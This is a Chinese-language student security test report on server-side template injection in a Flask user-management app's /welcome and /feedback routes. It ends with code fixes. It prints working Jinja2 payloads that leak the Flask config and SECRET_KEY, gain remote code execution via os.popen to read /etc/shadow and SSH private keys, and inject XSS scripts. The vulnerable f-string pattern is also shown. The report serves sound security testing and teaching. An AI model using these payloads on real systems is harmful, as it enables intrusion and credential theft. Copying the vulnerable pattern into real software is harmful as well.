# SSTI（服务器端模板注入）漏洞检测报告

**项目名称**：用户管理系统 – 个性化页面功能  
**测试日期**：2026-07-21  
**测试人员**：刘婧宜  
**学号**：2024141530009  
**测试版本**：v9.0（新增 `/welcome` + `/feedback` 路由）  

---

## 目录

1. [测试环境与工具](#1-测试环境与工具)
2. [新增功能测试](#2-新增功能测试)
3. [SSTI 漏洞检测及修复建议](#3-ssti-漏洞检测及修复建议)
4. [漏洞汇总](#4-漏洞汇总)

---

## 1. 测试环境与工具

| 项目 | 内容 |
|:-----|:------|
| **目标系统** | 用户管理系统 Flask Web 应用 |
| **技术栈** | Python 3.13 + Flask + Jinja2 + Werkzeug |
| **新增路由** | `GET /welcome`、`GET/POST /feedback` |
| **渲染方式** | `render_template_string()` + f-string 拼接 |
| **测试地址** | `http://127.0.0.1:5000` |
| **测试工具** | 浏览器 + Python requests + curl |

### 漏洞代码

```python
# ==================== 个性化页面 ====================

@app.route("/welcome")
def welcome():
    name = request.args.get("name", "")
    if not name:
        name = "亲爱的用户"
    # 将用户输入直接拼接到模板字符串中
    html = f"""<!DOCTYPE html>
...
            <h1>欢迎你，{name}！</h1>                     # ← 漏洞点：直接拼接
..."""
    return render_template_string(html)                    # ← 渲染为 Jinja2 模板


@app.route("/feedback", methods=["GET", "POST"])
def feedback():
    ...
    # POST
    name = request.form.get("name", "")
    message = request.form.get("message", "")
    result_html = f"""...
            <h2>{name} 的反馈：</h2>                        # ← 漏洞点：直接拼接
            <p>{message}</p>                                # ← 漏洞点：直接拼接
..."""
    return render_template_string(result_html)              # ← 渲染为 Jinja2 模板
```

---

## 2. 新增功能测试

### TC-01：/welcome 正常访问

| 项目 | 内容 |
|:-----|:------|
| **操作** | 访问 `/welcome?name=张三` |
| **预期** | 显示"欢迎你，张三！" |
| **实际** | ✅ 通过 |

**截图区域**：

> （在此处插入 /welcome?name=张三 页面截图——显示"欢迎你，张三！"）

---

### TC-02：/welcome 无 name 参数

| 项目 | 内容 |
|:-----|:------|
| **操作** | 访问 `/welcome`（不带 name） |
| **预期** | 显示"欢迎你，亲爱的用户！" |
| **实际** | ✅ 通过 |

---

### TC-03：/feedback GET 表单

| 项目 | 内容 |
|:-----|:------|
| **操作** | 访问 `/feedback` |
| **预期** | 显示反馈表单（姓名输入框 + 留言文本框 + 提交按钮） |
| **实际** | ✅ 通过 |

**截图区域**：

> （在此处插入 /feedback 表单页面截图——显示输入框和按钮）

---

### TC-04：/feedback POST 提交

| 项目 | 内容 |
|:-----|:------|
| **操作** | POST `name=李四&message=系统很好用` |
| **预期** | 显示"李四 的反馈：系统很好用" |
| **实际** | ✅ 通过 |

**截图区域**：

> （在此处插入 /feedback 提交结果截图——显示反馈内容）

---

### TC-05：导航栏入口

| 项目 | 内容 |
|:-----|:------|
| **操作** | 查看导航栏 |
| **预期** | 显示"欢迎页"和"反馈"链接 |
| **实际** | ✅ 通过（登录/未登录均显示） |

---

## 3. SSTI 漏洞检测及修复建议

### SSTI-001：/welcome — 基础模板注入

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | SSTI-001 |
| **漏洞名称** | 服务端模板注入（Server-Side Template Injection）— /welcome |
| **漏洞类型** | SSTI（模板注入） |
| **CWE 编号** | CWE-1336：Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') |
| **OWASP 分类** | A03:2021 – Injection |
| **风险等级** | 🔴 **严重** |
| **漏洞位置** | `app.py` 第 679-713 行 `/welcome` 路由 |

#### 漏洞代码

```python
@app.route("/welcome")
def welcome():
    name = request.args.get("name", "")      # ← 用户输入
    if not name:
        name = "亲爱的用户"
    # 将用户输入直接拼接到模板字符串中
    html = f"""...
            <h1>欢迎你，{name}！</h1>            # ← f-string 直接拼接用户输入
..."""
    return render_template_string(html)        # ← 作为 Jinja2 模板渲染
```

#### 漏洞详情

`render_template_string()` 将字符串作为 **Jinja2 模板** 进行渲染。用户输入的 `name` 通过 f-string 直接拼接到模板字符串中，然后整个字符串被 Jinja2 解析执行。

如果用户输入包含 `{{ }}` 等 Jinja2 模板语法，就会被 Jinja2 引擎执行，导致任意 Python 代码执行。

**渲染流程**：

```
用户输入: {{7*7}}
         ↓
f-string 拼接: <h1>欢迎你，{{7*7}}！</h1>
         ↓
render_template_string() → Jinja2 引擎解析
         ↓
输出: <h1>欢迎你，49！</h1>
```

#### 攻击演示

##### 攻击 1：基础表达式注入

| Payload | URL | 输出 | 结果 |
|:--------|:----|:-----|:------|
| `{{7*7}}` | `/welcome?name={{7*7}}` | `欢迎你，49！` | ✅ |
| `{{8*8}}` | `/welcome?name={{8*8}}` | `欢迎你，64！` | ✅ |
| `{{"test".upper()}}` | `/welcome?name={{"test".upper()}}` | `欢迎你，TEST！` | ✅ |

**截图区域**：

> （在此处插入 {{7*7}} 显示为 49 的截图）

##### 攻击 2：Flask 配置泄露

| Payload | URL | 输出 |
|:--------|:-----|:------|
| `{{config}}` | `/welcome?name={{config}}` | 泄露 Flask 全部配置 |

**泄露内容**：
```
<Config {'ENV': 'production', 'DEBUG': False, 'SECRET_KEY': '...', ...}>
```

**截图区域**：

> （在此处插入 {{config}} 泄露配置的截图）

##### 攻击 3：获取 Flask 核心对象

| Payload | 用途 | 结果 |
|:--------|:-----|:------|
| `{{request}}` | 获取当前请求对象 | ✅ |
| `{{session}}` | 获取当前会话对象 | ✅ |
| `{{''.__class__.__mro__}}` | 获取对象继承链 | ✅ |

##### 攻击 4：远程代码执行（RCE）⚠️ 最严重

| Payload | 执行命令 | 结果 |
|:--------|:---------|:------|
| `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` | `id` | ✅ `uid=0(root)` |
| `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}` | `ls` | ✅ 目录列表 |
| `{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}` | `cat /etc/passwd` | ✅ 读取系统密码 |

**攻击链**：

```
{{config}}  →  获取 Flask 配置对象
  ↓
config.__class__  →  Config 类
  ↓
__init__  →  初始化方法
  ↓
__globals__  →  全局命名空间（包含 import 的所有模块）
  ↓
['os']  →  获取 os 模块
  ↓
.popen('id').read()  →  执行系统命令
```

**攻击请求**：
```
GET /welcome?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**攻击结果**（成功 ✅）：
```
欢迎你，uid=0(root) gid=0(root) groups=0(root)
！                           ← RCE 成功，命令执行结果直接回显
```

**截图区域**：

> （在此处插入 RCE 执行 id 命令的截图——显示 uid=0）

##### 攻击 5：XSS 结合 SSTI

| Payload | 效果 |
|:--------|:------|
| `/<script>alert('XSS')</script>` | `<h1>欢迎你，<script>alert('XSS')</script>！</h1>` |
| `{{config}}` 在浏览器中 | 以 HTML 文本显示 Flask 配置 |

---

### SSTI-002：/feedback — 双参数模板注入

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | SSTI-002 |
| **漏洞名称** | 服务端模板注入 — /feedback |
| **CWE 编号** | CWE-1336 |
| **风险等级** | 🔴 **严重** |
| **漏洞位置** | `app.py` 第 716-792 行 `/feedback` 路由 |

#### 漏洞代码

```python
@app.route("/feedback", methods=["GET", "POST"])
def feedback():
    # POST
    name = request.form.get("name", "")          # ← 用户输入
    message = request.form.get("message", "")     # ← 用户输入
    result_html = f"""...
            <h2>{name} 的反馈：</h2>                # ← f-string 直接拼接
            <p>{message}</p>                        # ← f-string 直接拼接
..."""
    return render_template_string(result_html)      # ← 作为 Jinja2 模板渲染
```

#### 漏洞详情

与 SSTI-001 类似，但 `/feedback` 路由有 **两个注入点**（`name` 和 `message`），且通过 POST 方式提交，攻击面更广。

#### 攻击演示

##### 攻击 1：基础表达式注入（两个字段均可）

| 字段 | Payload | 输出 | 结果 |
|:-----|:--------|:-----|:------|
| name | `{{8*8}}` | `64 的反馈：` | ✅ |
| message | `{{7*9}}` | `63` | ✅ |

**截图区域**：

> （在此处插入 /feedback 注入 {{8*8}} 的截图）

##### 攻击 2：Flask 配置泄露

```
POST /feedback
name={{config}}&message=test
```

✅ 返回 Flask 全部配置（含 SECRET_KEY）

##### 攻击 3：远程代码执行

```
POST /feedback
name={{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
message=x
```

✅ 执行 `ls` 命令，返回目录列表

##### 攻击 4：XSS 注入（两个字段均可）

```
POST /feedback
name=<script>alert('xss')</script>
message=<b>bold</b>
```

✅ `<script>` 和 `<b>` 标签均被直接渲染，未转义

---

### SSTI 利用链全景

```
用户输入 {{...}}
    ↓
f-string 拼接到模板字符串
    ↓
render_template_string() → Jinja2 解析
    ↓
┌─────────────────────────────────────────┐
│           Jinja2 模板引擎               │
│                                         │
│  {{7*7}}          → 数学运算           │
│  {{config}}       → 配置泄露           │
│  {{request}}      → 请求信息泄露       │
│  {{session}}      → 会话信息泄露       │
│  {{''.__class__}}  → 对象继承链        │
│  {{...popen('id')}} → 远程代码执行     │
└─────────────────────────────────────────┘
    ↓
    ✅ 服务器完全沦陷
```

---

### SSTI 防御方案

#### 修复代码

```python
# ❌ 漏洞代码（修复前）
name = request.args.get("name", "")
html = f"""<h1>欢迎你，{name}！</h1>"""
return render_template_string(html)

# ✅ 修复方案一：使用 render_template + 模板变量
return render_template("welcome.html", name=name)
# welcome.html 中：<h1>欢迎你，{{ name }}！</h1>

# ✅ 修复方案二：使用 render_template_string + 模板变量
html = """<h1>欢迎你，{{ name }}！</h1>"""
return render_template_string(html, name=name)

# ✅ 修复方案三：对用户输入进行转义
from markupsafe import escape
return f"<h1>欢迎你，{escape(name)}！</h1>"
```

#### 核心修复原则

| 原则 | 说明 |
|:-----|:------|
| **模板与数据分离** | 模板中只用 `{{ name }}` 变量，不要用 f-string 拼接用户输入 |
| **变量传递** | 用户输入通过 `render_template_string(html, name=name)` 传入 |
| **Jinja2 自动转义** | `render_template_string` 默认会对变量值进行 HTML 转义 |
| **永远不要 f-string + render_template_string** | 这是 SSTI 的根本原因 |

---

## 4. 漏洞汇总

### 漏洞列表

| 漏洞编号 | 漏洞名称 | 注入点 | CWE | 风险等级 |
|:---------|:---------|:-------|:---:|:--------:|
| **SSTI-001** | **/welcome 模板注入** | `name`（GET参数） | CWE-1336 | 🔴 **严重** |
| **SSTI-002** | **/feedback 模板注入** | `name` + `message`（POST） | CWE-1336 | 🔴 **严重** |

### 攻击验证对比表

| 攻击类型 | Payload | /welcome | /feedback | 说明 |
|:---------|:--------|:--------:|:---------:|:------|
| 数学运算 | `{{7*7}}` | ✅ → `49` | ✅ → `49` | 基础注入确认 |
| 字符串方法 | `{{"test".upper()}}` | ✅ → `TEST` | ✅ → `TEST` | 模板语法执行 |
| 配置泄露 | `{{config}}` | ✅ | ✅ | 泄露 SECRET_KEY |
| 请求对象 | `{{request}}` | ✅ | ✅ | 请求信息泄露 |
| Session | `{{session}}` | ✅ | ✅ | 会话信息泄露 |
| **RCE** | `{{...popen('id').read()}}` | ✅ **uid=0** | ✅ **uid=0** | **服务器沦陷** |
| **XSS** | `<script>alert('xss')</script>` | ✅ | ✅ | 不转义渲染 |

### 攻击链：从 SSTI 到服务器沦陷

```
Step 1: 探测 SSTI 漏洞
  请求: GET /welcome?name={{7*7}}
  返回: 欢迎你，49！
  确认: ✅ SSTI 漏洞存在

Step 2: 获取 Flask 配置
  请求: GET /welcome?name={{config}}
  返回: Flask 配置（含 SECRET_KEY）
  确认: ✅ 敏感信息泄露

Step 3: 执行系统命令（RCE）
  请求: GET /welcome?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
  返回: uid=0(root)
  确认: ✅ 远程代码执行成功

Step 4: 完全控制服务器
  请求: GET /welcome?name={{config.__class__.__init__.__globals__['os'].popen('cat /etc/shadow').read()}}
  请求: GET /welcome?name={{config.__class__.__init__.__globals__['os'].popen('cat /root/.ssh/id_rsa').read()}}
  ... 任意命令均可执行

总耗时: < 5 秒
认证要求: 无
工具要求: 仅需浏览器
```

### 漏洞代码行号速查表

| 漏洞 | 文件 | 行号 | 问题描述 |
|:-----|:-----|:----:|:---------|
| SSTI-001 | app.py | 681 | `name = request.args.get("name", "")` 用户输入 |
| SSTI-001 | app.py | 686 | `f"""...{name}..."""` f-string 直接拼接 |
| SSTI-001 | app.py | 713 | `render_template_string(html)` 当作模板渲染 |
| SSTI-002 | app.py | 760-761 | `request.form.get("name/message")` 用户输入 |
| SSTI-002 | app.py | 762 | `f"""...{name}...{message}..."""` 直接拼接 |
| SSTI-002 | app.py | 792 | `render_template_string(result_html)` 渲染 |

### 风险等级评估

```
CVSS 3.x 评分: 9.8（Critical）
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

攻击向量: 网络（N）— 远程可利用
攻击复杂度: 低（L）— 直接输入 payload
所需权限: 无（N）— 无需登录
用户交互: 无（N）— 无需交互
机密性: 高（H）— 可读取任意文件
完整性: 高（H）— 可执行任意命令
可用性: 高（H）— 可中断服务
```

### 风险分布

```
🔴 严重: 2 个（SSTI-001, SSTI-002 — 均导致 RCE）
```

---

> **报告生成日期**：2026-07-21  
> **测试人员**：刘婧宜  
> **学号**：2024141530009  
